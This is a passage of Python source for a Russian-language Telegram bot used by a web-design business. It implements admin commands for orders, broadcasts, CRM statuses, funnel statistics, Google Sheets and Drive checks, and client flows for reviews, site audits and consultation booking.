                           f"<b>{PARTNER_STATUS_RU[key]}</b>\nВаш код: <code>{p['partner_code']}</code>")
            except Exception as e:
                print("notify partner err", e)
            return
        if low.startswith("/post"):
            send(chat_id, "📣 <b>Новая рассылка</b>\nВыберите тему - отправим только "
                          "подписчикам этой темы.\n\n<i>Совет: «🤖 Черновик от AI» сгенерирует "
                          "текст, который можно отредактировать.</i>",
                 {"inline_keyboard":
                     [[{"text": f"{TOPICS[k]} · {len(topic_subscribers(k))}",
                        "callback_data": f"bc:new:{k}"},
                       {"text": "🤖 AI", "callback_data": f"bc:ai:{k}"}] for k in TOPICS]})
            return
        if low.startswith("/broadcasts"):
            lines = ["📣 <b>Последние рассылки</b>"]
            for bid in range(max(1, next_broadcast_id() - 1), 0, -1):
                b = bc_get(bid)
                if not b:
                    continue
                lines.append(f"№{bid} · {TOPICS.get(b['topic'], b['topic'])} · "
                             f"✅{b.get('sent_count', 0)} ❌{b.get('failed_count', 0)} · {b.get('status')}")
                if len(lines) > 10:
                    break
            send(chat_id, "\n".join(lines) if len(lines) > 1 else "Рассылок пока нет.")
            return
        if low == "/admin":
            open_admin_panel(chat_id); return
        # --- Производственные промпты (ТЗ: 6 шаблонов × профили × режимы) ---
        if low.startswith("/prompts"):
            parts_g = text.split()
            if len(parts_g) < 2 or not parts_g[1].isdigit():
                send(chat_id, "Формат: /prompts &lt;telegram_id&gt; [regen]\n"
                              "Выдаёт все 6 промптов. regen - пересобрать заново."); return
            tuid = int(parts_g[1])
            regen = len(parts_g) > 2 and parts_g[2].lower() in ("regen", "regenerate", "заново")
            d = _get(f"onyx:quest:{tuid}")
            if not d:
                send(chat_id, "У клиента нет заполненной анкеты."); return
            changes = _get(f"onyx:changes:{tuid}") or ""
            row = build_prompts_row(tuid, d, regenerate=regen, client_changes=changes)
            if row.get("generation_status") != "READY":
                send(chat_id, f"❌ Статус: {row.get('generation_status')}\n{row.get('error_message', '')}"); return
            send(chat_id, f"🧠 <b>6 промптов готовы</b>\n"
                          f"Клиент: {row.get('company_name')} (id {tuid})\n"
                          f"Профиль: {row.get('tariff_profile')} «{row.get('tariff_name')}»\n"
                          f"Контент: {row.get('content_mode')} · Дизайн: {row.get('design_mode')}\n"
                          f"Опции: {row.get('purchased_options')}\n"
                          f"Версия шаблонов: {row.get('prompts_version')}\n\n"
                          "Отправляю по одному 👇")
            for i in range(1, 7):
                body = row.get(f"prompt_{i}", "")
                chunks = [body[x:x + 3500] for x in range(0, len(body), 3500)] or [""]
                send(chat_id, f"<b>━━ ПРОМПТ №{i}: {MASTER_TEMPLATES[i]['name']} ━━</b>")
                for ch in chunks:
                    send(chat_id, f"<pre>{ch}</pre>")
            return
        if low.startswith("/changes"):
            parts_c = text.split(maxsplit=2)
            if len(parts_c) < 2 or not parts_c[1].isdigit():
                send(chat_id, "Формат: /changes &lt;telegram_id&gt; [текст правок]\n"
                              "Без текста - покажет сохранённые правки клиента."); return
            tuid = int(parts_c[1])
            if len(parts_c) > 2:
                _set(f"onyx:changes:{tuid}", parts_c[2], ttl=YEAR)
                send(chat_id, f"✅ Правки сохранены. Пересоберите промпт №6: /prompts {tuid} regen")
            else:
                send(chat_id, f"✏️ Правки клиента id {tuid}:\n\n" + (_get(f"onyx:changes:{tuid}") or "- пусто -"))
            return
        # --- FACTORY: конвейер производства ---
        if low.startswith("/prompt"):
            parts_p = text.split()
            m_p = re.match(r"^/prompt(\d|qa)", parts_p[0].lower())
            if not m_p:
                send(chat_id, "Формат: /prompt1 &lt;telegram_id&gt; … /prompt6, /promptqa"); return
            key = {"1": "P1", "2": "P2", "3": "P3", "4": "P4", "5": "P5", "6": "P6",
                   "qa": "QA"}[m_p.group(1)]
            if len(parts_p) < 2 or not parts_p[1].isdigit():
                send(chat_id, f"Формат: {parts_p[0]} &lt;telegram_id клиента&gt;"); return
            tuid = int(parts_p[1])
            pl = PROMPT_LIBRARY[key]
            if key == "P1":
                d = _get(f"onyx:quest:{tuid}")
                if not d:
                    send(chat_id, "У этого клиента нет заполненной анкеты."); return
                body = build_prompt_1(tuid, d)
                factory_set_status(tuid, "prompt1_ready")
            else:
                body = pl["text"]
            head = f"🧠 <b>{pl['name']}</b> (v{pl['version']})\nКлиент: id {tuid}\n\n"
            # Telegram лимит 4096 - режем на части
            chunks = [body[i:i + 3500] for i in range(0, len(body), 3500)]
            send(chat_id, head + f"<pre>{chunks[0]}</pre>")
            for ch in chunks[1:]:
                send(chat_id, f"<pre>{ch}</pre>")
            return
        if low.startswith("/factory"):
            parts_f = text.split()
            if len(parts_f) == 1:
                lines = ["🏭 <b>Конвейер производства</b>", ""]
                found = False
                for luid in all_lead_ids():
                    f = factory_get(luid)
                    if f:
                        found = True
                        lines.append(f"id {luid} · {f.get('company_name', '-')} · "
                                     f"{FACTORY_STATUS_RU.get(f.get('factory_status'), f.get('factory_status'))}")
                lines.append("")
                lines.append("Команды: /factory &lt;id&gt; - карточка, /fstatus &lt;id&gt; &lt;статус&gt;, "
                             "/drive &lt;id&gt; &lt;поле&gt; &lt;ссылка&gt;")
                send(chat_id, "\n".join(lines) if found else "Пока нет проектов в конвейере.")
                return
            if parts_f[1].isdigit():
                tuid = int(parts_f[1]); f = factory_get(tuid)
                if not f:
                    send(chat_id, "Проект не найден (клиент не заполнил анкету?)"); return
                send(chat_id,
                     f"🏭 <b>{f.get('company_name', '-')}</b> (id {tuid})\n"
                     f"Ниша: {f.get('niche', '-')} · Город: {f.get('city', '-')}\n"
                     f"Статус: <b>{FACTORY_STATUS_RU.get(f.get('factory_status'), f.get('factory_status'))}</b>\n"
                     f"Приоритетная услуга: {f.get('priority_service', '-')}\n"
                     f"CTA: {f.get('CTA', '-')}\n"
                     f"Недостаёт: {f.get('missing_data', '-')}\n\n"
                     f"Материалы Drive:\nлого: {f.get('logo_url') or '-'}\n"
                     f"фото: {f.get('photos_url') or '-'}\nпортфолио: {f.get('portfolio_urls') or '-'}\n"
                     f"отзывы: {f.get('reviews_url') or '-'}\nдокументы: {f.get('documents_url') or '-'}\n\n"
                     f"Промпты: /prompt1 {tuid} … /prompt6 {tuid}, /promptqa {tuid}")
                return
            return
        if low.startswith("/fstatus"):
            parts_s = text.split()
            if len(parts_s) < 3 or not parts_s[1].isdigit():
                send(chat_id, "Формат: /fstatus &lt;id&gt; &lt;статус&gt;\nСтатусы: " +
                     ", ".join(FACTORY_STATUSES)); return
            if parts_s[2] not in FACTORY_STATUSES:
                send(chat_id, "Неизвестный статус. Доступные: " + ", ".join(FACTORY_STATUSES)); return
            f = factory_set_status(int(parts_s[1]), parts_s[2])
            send(chat_id, f"✅ Статус: {FACTORY_STATUS_RU[parts_s[2]]}" if f else "Проект не найден.")
            return
        if low.startswith("/auditlink"):
            # Ссылка для холодного касания: получатель жмёт и сразу видит разбор своего сайта.
            dom = text.split(maxsplit=1)[1].strip() if len(text.split(maxsplit=1)) > 1 else ""
            if not dom:
                send(chat_id, "Формат: /auditlink onyx-web.ru"); return
            u = valid_url(dom)
            if not u:
                send(chat_id, "Не похоже на адрес сайта. Пример: /auditlink onyx-web.ru"); return
            link = f"https://t.me/{bot_username()}?start=a_{encode_audit_payload(u)}"
            send_rich(chat_id,
                      f"# 🔗 Ссылка на аудит\n\n`{u}`\n\n```\n{link}\n```\n\n"
                      "> Отправьте владельцу сайта: он нажмёт и сразу получит разбор - "
                      "без вопросов и без ввода адреса.")
            return
        if low.startswith("/funnel"):
            # Воронка в цифрах: где именно теряются люди. Без этого любые
            # улучшения - догадки.
            parts_f = text.split()
            days = 7
            if len(parts_f) > 1 and parts_f[1].isdigit():
                days = max(1, min(90, int(parts_f[1])))
            rows = [(lbl, cnt_last_days(m, days)) for lbl, m in FUNNEL_VIEW]
            base = rows[0][1] or 0
            out = [f"# 📉 Воронка за {days} дн.", ""]
            if not base:
                out += ["Пока пусто - за этот период никто не заходил.", "",
                        "> Счётчики пишутся с этой версии бота, прошлые дни "
                        "в статистику не попадут."]
                send_rich(chat_id, "\n".join(out)); return
            out += ["| Этап | Людей | От входа | Шаг к шагу |", "|---|---|---|---|"]
            prev = None
            for lbl, n in rows:
                of_base = f"{round(n / base * 100)}%" if base else "-"
                step = "-" if prev is None else (f"{round(n / prev * 100)}%" if prev else "0%")
                out.append(f"| {lbl} | {n} | {of_base} | {step} |")
                prev = n
            drops = []
            for i in range(1, len(rows)):
                a_, b_ = rows[i - 1], rows[i]
                if a_[1] >= 3 and b_[1] < a_[1]:
                    drops.append((a_[1] - b_[1], a_[0], b_[0], round(b_[1] / a_[1] * 100)))
            drops.sort(reverse=True)
            if drops:
                out += ["", "---", "", "### Где теряем больше всего", ""]
                for lost, frm, to, pct in drops[:3]:
                    out.append(f"- **{frm} → {to}**: ушло {lost}, дошло {pct}%")
            out += ["", "> `/funnel 30` - за месяц. Данные по дням, хранятся 40 дней."]
            send_rich(chat_id, "\n".join(out))
            return
        if low.startswith("/consdone"):
            # Менеджер провёл консультацию → клиент получает переход к оформлению
            parts_c = text.split()
            if len(parts_c) < 2 or not parts_c[1].lstrip("-").isdigit():
                send(chat_id, "Формат: /consdone <id клиента>\nID видно в уведомлении о записи."); return
            cid_t = int(parts_c[1])
            crm_set(cid_t, "consult_done", "отмечено менеджером " + str(uid))
            log_event(cid_t, "consult_done")
            cancel_followups(cid_t, ("consult_reminder", "consult_invite"))
            ok_c = safe_send(cid_t, "Консультация проведена - спасибо!")
            if ok_c:
                send_rich(cid_t, PROJECT_START_MD, reply_markup=project_start_kb())
            send(chat_id, ("✅ Отмечено, клиенту отправлено оформление проекта."
                           if ok_c else "⚠️ Статус изменён, но клиенту не доставлено "
                                        "(мог заблокировать бота)."))
            return
        if low.startswith("/crm"):
            parts_c = text.split()
            if len(parts_c) == 1:
                send_rich(chat_id, "# 📊 Статусы воронки\n\n"
                          + "\n".join(f"`{k}` - {v}" for k, v in CRM_STATUSES)
                          + "\n\n> `/crm <id>` - где клиент сейчас\n"
                            "> `/crm <id> <статус>` - перевести вручную"); return
            if not parts_c[1].lstrip("-").isdigit():
                send(chat_id, "Формат: /crm <id> [статус]"); return
            cid_t = int(parts_c[1])
            if len(parts_c) == 2:
                r = crm_get(cid_t)
                hist = "\n".join(f"- {h.get('at', '')} - {CRM_RU.get(h.get('status'), h.get('status'))}"
                                 for h in (r.get("history") or [])[-12:]) or "- пока пусто"
                send_rich(chat_id, f"# 📊 Клиент {cid_t}\n\n"
                                   f"**Сейчас:** {CRM_RU.get(r.get('status'), '-')}\n\n"
                                   f"### История\n{hist}"); return
            if parts_c[2] not in CRM_RU:
                send(chat_id, "Неизвестный статус. `/crm` - список."); return
            crm_set(cid_t, parts_c[2], f"вручную, админ {uid}")
            send(chat_id, f"✅ {CRM_RU[parts_c[2]]}"); return
        if low.startswith("/voiceid"):
            state_set(uid, {"flow": "voiceid"})
            send(chat_id, "🎙 Пришлите голосовое - верну его file_id для "
                          "переменной MODEL_VOICE_FILE_ID."); return
        if low.startswith("/sheettest"):
            # Проверка записи в Google-таблицу: пишем тестовую строку и показываем,
            # что именно ответил скрипт. Отвечает на вопрос «почему заявки не приходят».
            if not SHEETS_WEBHOOK_URL:
                send_rich(chat_id,
                          "# ❌ Таблица не подключена\n\n"
                          "Переменной `SHEETS_WEBHOOK_URL` нет в настройках Vercel - "
                          "поэтому бот вообще ничего не пишет в таблицу.\n\n"
                          "Vercel → проект `onyx-bot-4xn3` → Settings → Environment Variables → "
                          "добавить `SHEETS_WEBHOOK_URL` = адрес скрипта, оканчивающийся на `/exec`, "
                          "и передеплоить.")
                return
            send(chat_id, "🔎 Пишем тестовую строку в таблицу…")
            _SHEET_BREAKER[0] = 0.0          # снимаем предохранитель для честной проверки
            t0 = time.time()
            okw = _post_to_sheet_now({
                "table": "SelfTest", "checked_at": time.strftime("%d.%m.%Y %H:%M:%S"),
                "by_telegram_id": uid, "note": "проверка командой /sheettest"})
            ms = (time.time() - t0) * 1000
            # Заодно спрашиваем у скрипта, к какой таблице он привязан
            where = ""
            try:
                _rq = urllib.request.Request(SHEETS_WEBHOOK_URL, method="GET")
                with urllib.request.urlopen(_rq, timeout=8) as _r:
                    where = (_r.read(600) or b"").decode("utf-8", "ignore").strip()
            except Exception as e:
                where = f"(не удалось спросить: {e})"
            if okw:
                send_rich(chat_id,
                          "# ✅ Таблица принимает записи\n\n"
                          f"| | |\n|---|---|\n"
                          f"| Ответ скрипта | {ms:.0f} мс |\n"
                          f"| Вкладка | SelfTest |\n\n"
                          "Открой вкладку `SelfTest` - там появилась строка с текущим временем. "
                          "Её можно удалить.\n\n"
                          f"```\n{where[:400]}\n```")
            else:
                last = _SHEET_LAST_ERR[0] or _get("onyx:sheet_last_err") or "-"
                send_rich(chat_id,
                          "# ❌ Таблица не приняла запись\n\n"
                          f"Причина: `{last}`\n\n"
                          "### Что обычно ломается\n"
                          "1. Развёртывание скрипта архивировано или создано заново - "
                          "тогда адрес `/exec` поменялся, а в Vercel остался старый\n"
                          "2. У веб-приложения доступ не «Все» (Anyone) - приходит страница логина\n"
                          "3. Скрипт падает с ошибкой - видно в Apps Script → «Выполнения»\n\n"
                          f"Что ответил адрес на обычный запрос:\n```\n{where[:400]}\n```")
            return
        if low.startswith("/drivetest"):
            # Проверка связки с Google Drive: создаём тестовую папку и показываем ссылку
            if not SHEETS_WEBHOOK_URL:
                send(chat_id, "❌ Не задана переменная SHEETS_WEBHOOK_URL."); return
            send(chat_id, "🔎 Проверяем Google Drive…")
            t0 = time.time()
            res = drive_call({"action": "drive_folder", "telegram_id": uid,
                              "order_id": "TEST", "company_name": "Проверка ONYX",
                              "city": "-"})
            ms = (time.time() - t0) * 1000
            if res and res.get("ok") and res.get("folder_url"):
                send_rich(chat_id,
                          "# ✅ Google Drive подключён\n\n"
                          f"| | |\n|---|---|\n"
                          f"| Папка | {res.get('name', '-')} |\n"
                          f"| Ответ | {ms:.0f} мс |\n\n"
                          f"[Открыть папку]({res['folder_url']})\n\n"
                          "Внутри должны быть 9 подпапок. Можно удалить эту тестовую папку - "
                          "она создана только для проверки.\n\n"
                          "> Теперь загрузка материалов от клиентов будет работать: "
                          "«Личный кабинет» → «📎 Материалы для сайта».")
            else:
                err = (res or {}).get("error", "нет ответа от скрипта")
                send_rich(chat_id,
                          "# ❌ Google Drive не отвечает\n\n"
                          f"Ошибка: `{err}`\n\n"
                          "### Что проверить\n"
                          "1. В Apps Script заполнен `ROOT_FOLDER_ID` (не оставлен шаблон)\n"
                          "2. Скрипт переразвёрнут после правки\n"
                          "3. При развёртывании выданы права на Диск\n"
                          "4. Доступ у веб-приложения - «Все» (Anyone)")
            return
        if low.startswith("/speed"):
            # Замер реальных задержек: где именно бот теряет время
            res = []
            t0 = time.time()
            _redis("GET", "onyx:__ping")
            t_redis = (time.time() - t0) * 1000
            # База Upstash и функция Vercel по умолчанию в одном регионе (us-east-1 / iad1),
            # поэтому нормой считаем единицы-десятки миллисекунд, а не сотни.
            res.append(("База: одна команда", t_redis, 25))

            t0 = time.time()
            _redis_many([("GET", "onyx:__ping"), ("GET", "onyx:__ping2"),
                         ("GET", "onyx:__ping3")])
            t_pipe = (time.time() - t0) * 1000
            res.append(("База: три команды пакетом", t_pipe, 35))

            if SHEETS_WEBHOOK_URL:
                t0 = time.time()
                try:
                    _rq = urllib.request.Request(SHEETS_WEBHOOK_URL, method="GET")
                    with urllib.request.urlopen(_rq, timeout=6):
                        pass
                except Exception:
                    pass
                res.append(("Google-таблица", (time.time() - t0) * 1000, 800))

            t0 = time.time()
            tg("getMe")
            res.append(("Telegram API", (time.time() - t0) * 1000, 300))

            lines = ["# ⚡️ Замер скорости", "", "| Что | Задержка | Оценка |", "|---|---|---|"]
            for name, ms, good in res:
                mark = "🟢 норм" if ms <= good else ("🟡 терпимо" if ms <= good * 2.5 else "🔴 медленно")
                lines.append(f"| {name} | {ms:.0f} мс | {mark} |")
            lines += ["", f"Пакетная отправка в базу: "
                      f"{'✅ поддерживается' if _PIPE_OK[0] else '❌ не поддерживается'}", ""]
            sheet_ms = next((ms for n, ms, _ in res if "таблиц" in n), 0)
            if t_redis > 80:
                lines += ["> 🔴 **База неожиданно далеко.** Обычно Upstash и функция Vercel "
                          "стоят в одном регионе и отвечают за 5-20 мс. Проверьте регион базы "
                          "в консоли Upstash - он должен совпадать с регионом функции.", ""]
            elif t_redis > 25:
                lines += ["> 🟡 База отвечает чуть медленнее обычного, но на скорость кнопок "
                          "это почти не влияет.", ""]
            else:
                lines += ["> 🟢 База рядом с ботом - как и должно быть.", ""]
            if sheet_ms > 1500:
                lines += [f"> ⚠️ **Google-таблица отвечает {sheet_ms:.0f} мс** - это самая "
                          "медленная часть. Клиента она больше не тормозит: запись уходит "
                          "после ответа. Но если цифра выше 5 секунд, стоит упростить "
                          "Apps Script.", ""]
            lines.append("*Первый запуск после простоя всегда медленнее на 1-2 секунды - "
                         "это холодный старт Vercel, а не бот. Повторите команду второй раз, "
                         "чтобы увидеть реальные цифры.*")
            send_rich(chat_id, "\n".join(lines))
            return
        if low.startswith("/richtest"):
            # Живая проверка Rich Messages: пробуем все форматы и показываем, какой принял Telegram
            _del("onyx:rich_shape")
            demo = ("## ✅ Rich Messages работают\n\n"
                    "### Что теперь умеет бот\n"
                    "- [x] Заголовки разных уровней\n"
                    "- [x] Списки и чек-листы\n"
                    "- [x] Таблицы\n\n"
                    "| Тариф | Запуск | Разработка |\n|---|---|---|\n"
                    "| Старт онлайн | 5 990 ₽ | **0 ₽** |\n"
                    "| Сайт + заявки | 8 900 ₽ | **0 ₽** |\n"
                    "| Система продаж | от 19 900 ₽ | **0 ₽** |\n\n"
                    "---\n\n> 💡 Это сообщение отправлено методом `sendRichMessage`.\n\n"
                    "Обычный текст с **жирным**, *курсивом* и `кодом`.")
            r = send_rich(chat_id, demo, "Rich Messages не поддерживаются - работаем на обычном HTML.")
            shape = _get("onyx:rich_shape") or "-"
            send(chat_id, f"🔎 <b>Результат проверки</b>\nФормат: <code>{shape}</code>\n"
                          + ("✅ Rich Messages включены." if shape not in ("none", "-")
                             else "⚠️ Не поддерживается, работаем на HTML."))
            return
        if low.startswith("/drive"):
            parts_d = text.split(maxsplit=3)
            fields = ["logo_url", "photos_url", "portfolio_urls", "reviews_url", "documents_url"]
            if len(parts_d) < 4 or not parts_d[1].isdigit() or parts_d[2] not in fields:
                send(chat_id, "Формат: /drive &lt;id&gt; &lt;поле&gt; &lt;ссылка&gt;\nПоля: " +
                     ", ".join(fields) + "\n\nСтруктура папок клиента:\n" +
                     "\n".join(f"• {x}" for x in DRIVE_FOLDERS)); return
            tuid = int(parts_d[1])
            links = _get(f"onyx:drive:{tuid}") or {}
            links[parts_d[2]] = parts_d[3].strip()
            _set(f"onyx:drive:{tuid}", links, ttl=YEAR)
            f = factory_get(tuid)
            if f:
                f[parts_d[2]] = parts_d[3].strip()
                d = _get(f"onyx:quest:{tuid}") or {}
                f["PROMPT_1_READY"] = build_prompt_1(tuid, d)
                factory_save(f)
            send(chat_id, f"✅ Ссылка сохранена: {parts_d[2]}\nПромпт №1 пересобран.")
            return
        if low == "/export":
            leads = len(all_lead_ids())
            orders = len(all_order_ids())
            tasks = len(all_task_ids())
            tickets = len(all_ticket_ids())
            prods = len(all_prod_ids())
            send(chat_id,
                 "📤 <b>Экспорт данных ONYX</b>\n\n"
                 "Все данные пишутся в Google Sheets (листы: Clients, Questionnaire, Orders, "
                 "Subscriptions, Audits, Reviews, Partners, Leads, Events, Tasks, FollowUps, "
                 "ProductionSites, Domains, SupportTickets, AuditOffers) - это и есть выгрузка/бэкап.\n\n"
                 "<b>Сейчас в базе:</b>\n"
                 f"Клиентов/лидов: {leads}\nЗаказов: {orders}\nЗадач: {tasks}\n"
                 f"Обращений: {tickets}\nПроектов в производстве: {prods}\n\n"
                 "Открыть таблицу можно по ссылке, настроенной в SHEETS_WEBHOOK_URL / вашей Google-таблице.")
            return
        if low == "/admin_help":
            send(chat_id,
                 "🛠 <b>Админ-команды</b>\n"
                 "/sheettest - проверить запись в Google-таблицу\n"
                 "/orders - последние заказы\n"
                 "/invoices - заказы, ждущие счёта (юрлица)\n"
                 "/order &lt;№&gt; - детали заказа\n"
                 "/status &lt;№&gt; &lt;ключ&gt; - сменить статус\n"
                 "/set_order_status &lt;№&gt; [статус] - статус проекта (кнопки, если без статуса)\n"
                 "/paid &lt;№&gt; - отметить заказ оплаченным (после поступления по счёту)\n"
                 "ключи проекта: created, waiting_payment, paid_waiting_start, questionnaire_review, in_production, design_review, domain_setup, final_check, completed, paused, cancelled\n"
                 "/reply &lt;id&gt; &lt;текст&gt; - ответить на обращение\n"
                 "/export - сводка по данным\n"
                 "/post - рассылка по теме (с предпросмотром)\n"
                 "/broadcasts - история рассылок\n"
                 "/partners - заявки партнёров\n"
                 "/partner_status &lt;id&gt; &lt;статус&gt; - статус партнёра\n"
                 "/broadcast &lt;текст&gt; - рассылка всем")
            return
        if low.startswith("/invoices"):
            ids = all_order_ids()
            lines = ["🧾 <b>Запросы счёта (юрлица)</b>"]
            found = False
            for oid in ids:
                o = order_get(oid)
                if not o or o.get("payment_status") != "invoice_requested":
                    continue
                found = True
                names = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", []))
                lines.append(f"№{oid} · id {o['uid']} · ИНН {o.get('inn', '-')} · "
                             f"{fmt_amount(o.get('total', 0))} · {names}")
            send(chat_id, "\n".join(lines) if found else "Запросов счёта нет.")
            return
        if low.startswith("/paid "):
            try:
                oid = int(low.split()[1])
            except Exception:
                send(chat_id, "Формат: /paid &lt;№&gt;"); return
            o = order_get(oid)
            if not o:
                send(chat_id, "Заказ не найден."); return
            if o.get("payment_status") == "paid":
                send(chat_id, f"Заказ №{oid} уже оплачен."); return
            mark_order_paid(o, source="Ручное подтверждение (счёт)")
            send(chat_id, f"✅ Заказ №{oid} отмечен оплаченным, клиент уведомлён.")
            return
        if low.startswith("/set_order_status"):
            parts = low.split()
            if len(parts) < 2:
                send(chat_id, "Формат: /set_order_status &lt;№&gt; [статус]\n"
                              "Без статуса - покажу кнопки."); return
            try:
                oid = int(parts[1])
            except Exception:
                send(chat_id, "№ должен быть числом."); return
            o = order_get(oid)
            if not o:
                send(chat_id, "Заказ не найден."); return
            if len(parts) >= 3:
                key = parts[2]
                if key not in PROJECT_STATUS:
                    send(chat_id, "Статусы: " + ", ".join(PROJECT_STATUS.keys())); return
                apply_project_status(oid, key)
                send(chat_id, f"✅ Заказ №{oid} → {ps_label(key)}. Клиент уведомлён."); return
            send(chat_id, f"Выберите новый статус для заказа №{oid}:", admin_status_kb(oid))
            return
        if low.startswith("/orders"):
            ids = all_order_ids()
            if not ids:
                send(chat_id, "Заказов пока нет."); return
            lines = ["📦 <b>Последние заказы</b>"]
            for oid in ids[-15:]:
                o = order_get(oid)
                if not o:
                    continue
                lines.append(f"№{oid} · id {o['uid']} · {', '.join(o.get('items', []))} · {o.get('total', 0)} ₽ · "
                             f"{STATUS.get(o.get('status'), o.get('status'))} · 💳 {o.get('payment_status', '-')}")
            send(chat_id, "\n".join(lines)); return
        if low.startswith("/order "):
            try:
                oid = int(low.split()[1])
            except Exception:
                send(chat_id, "Формат: /order &lt;№&gt;"); return
            o = order_get(oid)
            if not o:
                send(chat_id, "Заказ не найден."); return
            send(chat_id, f"📦 <b>Заказ №{oid}</b>\nКлиент id: {o['uid']}\nУслуги: {', '.join(o.get('items', []))}\nСумма: {o.get('total', 0)} ₽\nСпособ: {o.get('payment_method', '') or o.get('payment_type', '')}\nОплата: {o.get('payment_status', '-')}\nИНН: {o.get('inn', '-')}\nСтатус: {STATUS.get(o.get('status'), o.get('status'))}\nСоздан: {o.get('created', '')}")
            return
        if low.startswith("/status "):
            parts = low.split()
            if len(parts) < 3 or parts[2] not in STATUS:
                send(chat_id, "Формат: /status &lt;№&gt; &lt;ключ&gt;\nКлючи: " + ", ".join(STATUS)); return
            try:
                oid = int(parts[1])
            except Exception:
                send(chat_id, "№ должен быть числом."); return
            o = set_order_status(oid, parts[2])
            if not o:
                send(chat_id, "Заказ не найден."); return
            send(chat_id, f"✅ Статус заказа №{oid}: {STATUS[parts[2]]}")
            try:
                send(o["uid"], f"🔔 Статус вашего заказа №{oid}: <b>{STATUS[parts[2]]}</b>")
                if parts[2] == "done":
                    pu = user_get(o["uid"]) or {}
                    review_start(o["uid"], o["uid"], pu.get("username", ""), order_id=oid, intro=True)
            except Exception as e:
                print("notify client err", e)
            return
        if low.startswith("/broadcast"):
            parts = text.split(maxsplit=1)
            if len(parts) < 2:
                send(chat_id, "Формат: /broadcast &lt;текст&gt;"); return
            n = do_broadcast(parts[1])
            send(chat_id, f"📣 Отправлено: {n}"); return

    if is_admin(uid) and text.startswith("/"):
        parts = text.split()
        cmd = parts[0]
        if cmd == "/admin":
            send(chat_id, ADMIN_HELP); return
        if cmd == "/orders":
            send(chat_id, admin_orders_list()); return
        if cmd == "/order" and len(parts) >= 2:
            send(chat_id, admin_order_detail(parts[1])); return
        if cmd == "/status" and len(parts) >= 3:
            send(chat_id, admin_set_status(parts[1], parts[2])); return

    MENU_TRIGGERS = {"🖼 Примеры сайтов", "🔍 Бесплатный аудит", "🛒 Тарифы и услуги", "📦 Мой заказ",
                     "👤 Личный кабинет", "🤝 Стать партнёром", "🆘 Поддержка", "⭐ Отзывы ONYX",
                     "📄 Документы"}
    st = state_get(uid)
    if st and st.get("flow") in ("brief", "cap", "svc_comment", "invoice_inn", "audit_url",
                                 "review", "review_improve", "partner", "bc_text", "bc_confirm",
                                 "cons", "ask_mgr", "qual8", "voiceid") and text in MENU_TRIGGERS:
        state_del(uid); st = None
    # --- Этап 8: текст отзыва / что улучшить ---
    if st and st.get("flow") == "review_improve":
        r = review_get(st.get("rid"))
        state_del(uid)
        uname = f"@{user.get('username')}" if user.get("username") else "-"
        notify_admins("⚠️ <b>Важная обратная связь (низкая оценка)</b>\n"
                      f"Клиент: id {uid} {uname}\n"
                      f"Оценка: {(r or {}).get('rating', '-')}/5\n"
                      f"Что улучшить: {text}")
        if r:
            r["text_review"] = ((r.get("text_review") or "") + f" | Что улучшить: {text}").strip(" |")
            review_save(r)
        send(chat_id, "Спасибо, что написали. Мы обязательно разберёмся и станем лучше 🤝", MAIN_MENU)
        return
    if st and st.get("flow") == "review" and st.get("step") == "text":
        r = review_get(st.get("rid"))
        if r:
            r["text_review"] = text
            r["status"] = "text_received"
            review_save(r, to_sheet=False)
        send(chat_id, "Спасибо за отзыв! 🙏")
        review_ask_video(chat_id, uid, st.get("rid"))
        return
    if st and st.get("flow") == "review" and st.get("step") == "video":
        send(chat_id, "Жду видеокружок 📹 - или нажмите «Пропустить» выше.")
        return
    if st and st.get("flow") == "audit_url":
        url = valid_url(text)
        if not url:
            send(chat_id, "Это не похоже на ссылку. Пришлите адрес сайта, например: onyx-web.ru")
            return
        # Аудит - самое дорогое действие: внешний запрос плюс запись в таблицу.
        # Без ограничения один человек может гонять бота по чужим адресам без конца.
        if not rate_ok(uid, "audit"):
            rate_notice(chat_id, uid, "audit")
            return
        state_del(uid)
        audit_start(chat_id, uid, url, username=user.get("username", ""))
        return
    if st and st.get("flow") == "ask_mgr":
        back = st.get("back")
        state_del(uid)
        escalate(uid, "Вопрос от клиента", text[:800])
        send_rich(chat_id,
                  f"# ✅ Передал менеджеру\n\n{MANAGER_NAME} ответит лично, обычно "
                  f"в течение 30 минут. Пока можно продолжить - ответ придёт сюда же.\n\n"
                  f"Не хотите ждать? Напишите ему напрямую: {manager_md()}",
                  reply_markup={"inline_keyboard": (
                      ([[{"text": "▶️ Продолжить", "callback_data": back}]] if back else [])
                      + [[{"text": "🏠 В меню", "callback_data": "b:home"}]])})
        return
    if st and st.get("flow") == "cons_phone":
        if text in ("Не сейчас", "не сейчас"):
            state_del(uid)
            send(chat_id, "Хорошо, свяжемся здесь. 👌", MAIN_MENU)
            return
        _ph = (contact or {}).get("phone_number") or re.sub(r"[^\d+]", "", text or "")
        if len(re.sub(r"\D", "", _ph)) < 10:
            send(chat_id, "Похоже, номер неполный. Пришлите в формате +7 999 123-45-67 "
                          "или нажмите «Отправить мой номер».")
            return
        state_del(uid)
        _p = user_get(uid) or {}
        _p["phone"] = _ph
        user_save(uid, _p)
        _c = _get(f"onyx:consult:{uid}") or {}
        if _c:
            _c["phone"] = _ph
            _set(f"onyx:consult:{uid}", _c, ttl=YEAR)
        lead_touch(uid, username=user.get("username"), action="phone_left")
        log_event(uid, "phone_left")
        post_to_sheet({"table": "Consultations", "telegram_id": uid, "phone": _ph,
                       "updated_at": now_str()})
        notify_admins(f"📱 Клиент оставил номер\nid {uid} · <code>{_esc(_ph)}</code>")
        send(chat_id, "Спасибо, записал. Позвоним только в оговорённое время. 👌", MAIN_MENU)
        return

    if st and st.get("flow") == "cons" and st.get("stage") == "phone":
        _ph = re.sub(r"[^\d+]", "", text or "")
        if len(re.sub(r"\D", "", _ph)) < 10:
            send(chat_id, "Похоже, номер неполный. Пришлите в формате +7 999 123-45-67")
            return
        st["phone"] = _ph; st["stage"] = ""; state_set(uid, st)
        send_rich(chat_id, f"# 📞 Когда позвонить?\n\nНомер записали: `{_ph}`",
                  reply_markup=cons_when_kb())
        return
    if st and st.get("flow") == "invoice_inn":
        invoice_inn_input(chat_id, user, uid, st, text); return
    if st and st.get("flow") == "svc_comment":
        svc_comment_input(chat_id, uid, st, text); return
    if st and st.get("flow") == "brief":
        if st.get("stage") == "summary" or st.get("i", 0) >= len(steps_of(st)):
            send(chat_id, "Подтвердите анкету кнопками выше 👆"); return
        step = steps_of(st)[st["i"]]
        if step.get("text"):
            brief_text_input(chat_id, user, st, text, contact, msg.get("message_id")); return
        send(chat_id, "Пожалуйста, выберите вариант кнопкой в анкете выше 👆"); return
